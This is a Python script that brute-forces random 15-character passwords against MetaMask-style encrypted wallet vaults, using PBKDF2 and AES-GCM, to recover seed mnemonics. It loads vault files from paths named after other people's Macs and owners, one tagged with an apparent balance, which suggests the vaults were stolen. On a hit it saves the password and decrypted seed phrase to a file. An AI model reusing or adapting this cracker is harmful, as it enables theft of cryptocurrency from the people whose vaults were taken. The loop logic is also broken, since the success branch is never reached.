import json
import base64
from typing import Dict
from termcolor import colored
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Hash import SHA512
from Crypto.Protocol.KDF import PBKDF2
import json
from password_generator import PasswordGenerator
from datetime import datetime
from itertools import product
import random

pwo = PasswordGenerator()
pwo.minschars = 1
##pwo.excludeschars = '~!@#$%^&*()_+-=[]{}\|/?.>,<'
pwo.excludeschars = '><[]{}\|^`~;'
pwo.minnumbers = 1
pwo.minlchars = 1
pwo.minuchars = 1
pwo.maxlen = 15
pwo.minlen = 15

def key_from_password(password: str, salt: str, iteration: int):
    password_bytes = password.encode("utf-8")
    salt_bytes = base64.b64decode(salt)


    key = PBKDF2(
        password_bytes,
        salt_bytes,
        dkLen=32,
        count=iteration,
        hmac_hash_module=SHA256)
        
    return key


items = list()

items.append('d:\\DOSGAMES\\MAC_data\\Gregorys-MacBook-Air.local\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\CNH\\try-SULCOVA.localdomain\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\hhs\\5TM\\5TM-20250207-maxim\\vault_auto.json')
items.append('d:\\DOSGAMES\\MAC_data\\KSR\\PRW-118\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\KKH\\8_BBOOK-PRO.local_bal_130000\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\MHS\\2-Mac-Studio.local\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\MHS\\Levy\\vault.json')
items.append('d:\\DOSGAMES\\MAC_data\\symai-dev\\vault.json')
items.append('D:\\DOSGAMES\\MAC_data\\tm_ldb\\Philipps-MacBook-Air.local\\vault.json')
items.append('D:\\DOSGAMES\\MAC_data\\JJJ\\Brandon_Thorn\\vault_auto.json')
payloads = list()
for item in items:
    f = open(item, 'r')
    data = json.load(f)
    payloads.append(data)
    f.close()


cracked = False
charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()-+[]\{},.'


num = 0
print('running...')
while(1):
    randLen = random.randint(pwo.minlen, pwo.maxlen)
    password = pwo.shuffle_password(charset, randLen)    

    for payload in payloads:
        salt = payload["salt"]
        try:
            iteration = payload['keyMetadata']['params']['iterations']
        except:
            iteration = 10000
    
        key = key_from_password(password, salt, iteration)

        data = base64.b64decode(payload["data"])
        iv = base64.b64decode(payload["iv"])
        data_ = data[0:len(data)-len(iv)]


        cipher = AES.new(key, mode=AES.MODE_GCM, nonce=iv)
        decrypted_bytes = cipher.decrypt(data_)
        checkStr = base64.b64encode(decrypted_bytes)

        try:
            decrypted_text = decrypted_bytes.decode()
        except:
            continue
        else:
            cracked = True
            break
    

if cracked:
    print('cracked!!!')
    decrypted = json.loads(decrypted_text)
    cendata = decrypted[0]['data']['mnemonic']
    mndata = ''
    for citem in cendata:
        mndata = mndata + chr(citem)

    decrypted[0]['data']['mnemonic'] = mndata
    current_datetime = datetime.now().strftime("%Y%m%d-%H%M%S")
    filename = f"ak_{current_datetime}.txt"
    with open(filename, "a") as file:
        file.write('password:'+password)
        file.write('\n')
        file.write(json.dumps(decrypted))

else:
    print('not resolved.')
